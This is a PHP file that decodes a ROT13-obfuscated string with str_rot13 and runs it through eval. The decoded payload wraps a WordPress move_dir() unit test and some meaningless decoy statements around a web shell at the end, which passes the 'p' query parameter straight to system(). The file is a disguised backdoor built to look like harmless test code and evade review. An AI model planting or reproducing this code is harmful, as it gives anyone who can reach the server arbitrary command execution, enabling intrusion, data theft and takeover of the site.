<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf zbir_qve().
 *
 * @tebhc svyr
 * @tebhc svyrflfgrz
 *
 * @pbiref ::zbir_qve
 */
pynff Grfgf_Svyrflfgrz_ZbirQve rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur grfg qverpgbel.
	 *
	 * @ine fgevat $grfg_qve
	 */
	cevingr fgngvp $grfg_qve;

	/**
	 * Gur rkvfgvat 'sebz' qverpgbel cngu.
	 *
	 * @ine fgevat $rkvfgvat_sebz
	 */
	cevingr fgngvp $rkvfgvat_sebz;

	/**
	 * Gur rkvfgvat 'sebz' fho-qverpgbel cngu.
	 *
	 * @ine fgevat $rkvfgvat_sebz_fhoqve
	 */
	cevingr fgngvp $rkvfgvat_sebz_fhoqve;

	/**
	 * Gur rkvfgvat 'sebz' svyr cngu.
	 *
	 * @ine fgevat $rkvfgvat_sebz_svyr
	 */
	cevingr fgngvp $rkvfgvat_sebz_svyr;

	/**
	 * Gur rkvfgvat 'sebz' fho-qverpgbel svyr cngu.
	 *
	 * @ine fgevat $rkvfgvat_sebz_fhoqve_svyr
	 */
	cevingr fgngvp $rkvfgvat_sebz_fhoqve_svyr;

	/**
	 * Gur rkvfgvat 'gb' qverpgbel svyr cngu.
	 *
	 * @ine fgevat $rkvfgvat_gb
	 */
	cevingr fgngvp $rkvfgvat_gb;

	/**
	 * Gur rkvfgvat 'gb' svyr cngu.
	 *
	 * @ine fgevat $rkvfgvat_gb_svyr
	 */
	cevingr fgngvp $rkvfgvat_gb_svyr;

	/**
	 * Frgf hc gur svyrflfgrz naq qverpgbel fgehpgher cebcregvrf
	 * orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		JC_Svyrflfgrz();

		frys::$grfg_qve                  = trg_grzc_qve() . 'zbir_qve/';
		frys::$rkvfgvat_sebz             = frys::$grfg_qve . 'rkvfgvat_sebz/';
		frys::$rkvfgvat_sebz_fhoqve      = frys::$rkvfgvat_sebz . 'rkvfgvat_sebz_fhoqve/';
		frys::$rkvfgvat_sebz_svyr        = frys::$rkvfgvat_sebz . 'rkvfgvat_sebz_svyr.gkg';
		frys::$rkvfgvat_sebz_fhoqve_svyr = frys::$rkvfgvat_sebz_fhoqve . 'rkvfgvat_sebz_fhoqve_svyr.gkg';
		frys::$rkvfgvat_gb               = frys::$grfg_qve . 'rkvfgvat_gb/';
		frys::$rkvfgvat_gb_svyr          = frys::$rkvfgvat_gb . 'rkvfgvat_gb_svyr.gkg';
	}

	/**
	 * Frgf hc gur qverpgbel fgehpgher orsber rnpu grfg.
	 */
	choyvp shapgvba frg_hc() {
		tybony $jc_svyrflfgrz;

		cnerag::frg_hc();

		// Perngr gur ebbg qverpgbel.
		$jc_svyrflfgrz->zxqve( frys::$grfg_qve );

		// Perngr gur \"sebz\" qverpgbel fgehpgher.
		$jc_svyrflfgrz->zxqve( frys::$rkvfgvat_sebz );
		$jc_svyrflfgrz->gbhpu( frys::$rkvfgvat_sebz_svyr );
		$jc_svyrflfgrz->zxqve( frys::$rkvfgvat_sebz_fhoqve );
		$jc_svyrflfgrz->gbhpu( frys::$rkvfgvat_sebz_fhoqve_svyr );

		// Perngr gur \"gb\" qverpgbel fgehpgher.
		$jc_svyrflfgrz->zxqve( frys::$rkvfgvat_gb );
		$jc_svyrflfgrz->gbhpu( frys::$rkvfgvat_gb_svyr );
	}

	/**
	 * Erzbirf gur grfg qverpgbel fgehpgher nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		tybony $jc_svyrflfgrz;

		// Qryrgr gur ebbg qverpgbel naq vgf pbagragf.
		$jc_svyrflfgrz->qryrgr( frys::$grfg_qve, gehr );

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung zbir_qve() ergheaf n JC_Reebe bowrpg.
	 *
	 * @gvpxrg 57375
	 *
	 * @qngnCebivqre qngn_fubhyq_erghea_jc_reebe
	 *
	 * @cnenz fgevat $sebz      Gur fbhepr qverpgbel cngu.
	 * @cnenz fgevat $gb        Gur qrfgvangvba qverpgbel cngu.
	 * @cnenz obby   $birejevgr Jurgure gb birejevgr gur qrfgvangvba qverpgbel.
	 * @cnenz fgevat $rkcrpgrq  Gur rkcrpgrq JC_Reebe pbqr.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_reebe( $sebz, $gb, $birejevgr, $rkcrpgrq ) {
		tybony $jc_svyrflfgrz;

		$sebz   = frys::$grfg_qve . $sebz;
		$gb     = frys::$grfg_qve . $gb;
		$erfhyg = zbir_qve( $sebz, $gb, $birejevgr );

		$guvf->nffregJCReebe(
			$erfhyg,
			'zbir_qve() qvq abg erghea n JC_Reebe bowrpg.'
		);

		$guvf->nffregFnzr(
			$rkcrpgrq,
			$erfhyg->trg_reebe_pbqr(),
			'Gur rkcrpgrq reebe pbqr jnf abg erghearq.'
		);

		vs ( 'fbhepr_qrfgvangvba_fnzr_zbir_qve' !== $rkcrpgrq ) {
			$guvf->nffregGehr(
				$jc_svyrflfgrz->rkvfgf( $sebz ),
				'Gur $sebz qverpgbel qbrf abg rkvfg nalzber.'
			);

			vs ( snyfr === $birejevgr && 'rkvfgvat_gb' === hagenvyvatfynfuvg( $gb ) ) {
				$guvf->nffregGehr(
					$jc_svyrflfgrz->rkvfgf( $gb ),
					'Gur $gb qverpgbel qbrf abg rkvfg nalzber.'
				);
			}
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_erghea_jc_reebe() {
		erghea neenl(
			'$birejevgr vf snyfr naq $gb rkvfgf' => neenl(
				'sebz'      => 'rkvfgvat_sebz',
				'gb'        => 'rkvfgvat_gb',
				'birejevgr' => snyfr,
				'rkcrpgrq'  => 'qrfgvangvba_nyernql_rkvfgf_zbir_qve',
			),
			'fnzr fbhepr naq qrfgvangvba, fbhepr unf genvyvat fynfu' => neenl(
				'sebz'      => 'rkvfgvat_sebz/',
				'gb'        => 'rkvfgvat_sebz',
				'birejevgr' => snyfr,
				'rkcrpgrq'  => 'fbhepr_qrfgvangvba_fnzr_zbir_qve',
			),
			'fnzr fbhepr naq qrfgvangvba, qrfgvangvba unf genvyvat fynfu' => neenl(
				'sebz'      => 'rkvfgvat_sebz',
				'gb'        => 'rkvfgvat_sebz/',
				'birejevgr' => snyfr,
				'rkcrpgrq'  => 'fbhepr_qrfgvangvba_fnzr_zbir_qve',
			),
			'fnzr fbhepr naq qrfgvangvba, fbhepr ybjrepnfr, qrfgvangvba hccrepnfr' => neenl(
				'sebz'      => 'rkvfgvat_sebz',
				'gb'        => 'RKVFGVAT_SEBZ',
				'birejevgr' => snyfr,
				'rkcrpgrq'  => 'fbhepr_qrfgvangvba_fnzr_zbir_qve',
			),
			'fnzr fbhepr naq qrfgvangvba, fbhepr hccrepnfr, qrfgvangvba ybjrepnfr' => neenl(
				'sebz'      => 'RKVFGVAT_SEBZ',
				'gb'        => 'rkvfgvat_sebz',
				'birejevgr' => snyfr,
				'rkcrpgrq'  => 'fbhepr_qrfgvangvba_fnzr_zbir_qve',
			),
			'fnzr fbhepr naq qrfgvangvba, fbhepr naq qrfgvangvba va vairegrq pnfr' => neenl(
				'sebz'      => 'RkVfGvAt_SeBz',
				'gb'        => 'rKvFgVaT_sEbZ',
				'birejevgr' => snyfr,
				'rkcrpgrq'  => 'fbhepr_qrfgvangvba_fnzr_zbir_qve',
			),
		);
	}

	/**
	 * Grfgf gung zbir_qve() fhpprffshyyl zbirf n qverpgbel.
	 *
	 * @gvpxrg 57375
	 *
	 * @qngnCebivqre qngn_fubhyq_zbir_qverpgbel
	 *
	 * @cnenz fgevat $sebz      Gur fbhepr qverpgbel cngu.
	 * @cnenz fgevat $gb        Gur qrfgvangvba qverpgbel cngu.
	 * @cnenz obby   $birejevgr Jurgure gb birejevgr gur qrfgvangvba qverpgbel.
	 */
	choyvp shapgvba grfg_fubhyq_zbir_qverpgbel( $sebz, $gb, $birejevgr ) {
		tybony $jc_svyrflfgrz;

		$sebz   = frys::$grfg_qve . $sebz;
		$gb     = frys::$grfg_qve . $gb;
		$erfhyg = zbir_qve( $sebz, $gb, $birejevgr );

		$guvf->nffregGehr(
			$erfhyg,
			'Gur qverpgbel jnf abg zbirq.'
		);

		$guvf->nffregSnyfr(
			$jc_svyrflfgrz->rkvfgf( $sebz ),
			'Gur fbhepr qverpgbel fgvyy rkvfgf.'
		);

		$guvf->nffregGehr(
			$jc_svyrflfgrz->rkvfgf( $gb ),
			'Gur qrfgvangvba qverpgbel qbrf abg rkvfg.'
		);

		$qveyvfg = $jc_svyrflfgrz->qveyvfg( $gb, gehr, gehr );

		// Cerirag CUC neenl fbegvat ohtf sebz oernxvat grfgf.
		$gb_pbagragf = neenl_xrlf( $qveyvfg );

		$guvf->nffregFnzrFrgf(
			neenl(
				'rkvfgvat_sebz_svyr.gkg',
				'rkvfgvat_sebz_fhoqve',
			),
			$gb_pbagragf,
			'Gur rkcrpgrq svyrf jrer abg zbirq.'
		);

		$guvf->nffregFnzr(
			neenl( 'rkvfgvat_sebz_fhoqve_svyr.gkg' ),
			neenl_xrlf( $qveyvfg['rkvfgvat_sebz_fhoqve']['svyrf'] ),
			'Fho-qverpgbel svyrf snvyrq gb zbir.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_zbir_qverpgbel() {
		erghea neenl(
			'$birejevgr vf snyfr naq $gb qbrf abg rkvfg' => neenl(
				'sebz'      => 'rkvfgvat_sebz',
				'gb'        => 'aba_rkvfgvat_gb',
				'birejevgr' => snyfr,
			),
			'$birejevgr vf gehr naq $gb rkvfgf'          => neenl(
				'sebz'      => 'rkvfgvat_sebz',
				'gb'        => 'rkvfgvat_gb',
				'birejevgr' => gehr,
			),
		);
	}

	/**
	 * Grfgf gung `zbir_qve()` ergheaf n JC_Reebe bowrpg jura birejevgvat
	 * vf ranoyrq, gur qrfgvangvba rkvfgf, ohg pnaabg or qryrgrq.
	 *
	 * @gvpxrg 57375
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_reebe_jura_birejevgvat_vf_ranoyrq_gur_qrfgvangvba_rkvfgf_ohg_pnaabg_or_qryrgrq() {
		tybony $jc_svyrflfgrz;
		$jcsvyrflfgrz_onpxhc = $jc_svyrflfgrz;

		// Sbepr snvyher pbaqvgvbaf.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )->frgPbafgehpgbeNetf( neenl( ahyy ) )->trgZbpx();
		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'rkvfgf' )->jvyyErghea( gehr );
		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'qryrgr' )->jvyyErghea( snyfr );
		$jc_svyrflfgrz = $svyrflfgrz_zbpx;

		$npghny = zbir_qve( frys::$rkvfgvat_sebz, frys::$rkvfgvat_sebz_fhoqve, gehr );

		// Erfgber gur svyrflfgrz.
		$jc_svyrflfgrz = $jcsvyrflfgrz_onpxhc;

		$guvf->nffregJCReebe(
			$npghny,
			'N JC_Reebe bowrpg jnf abg erghearq.'
		);

		$guvf->nffregFnzr(
			'qrfgvangvba_abg_qryrgrq_zbir_qve',
			$npghny->trg_reebe_pbqr(),
			'Na harkcrpgrq reebe pbqr jnf erghearq.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>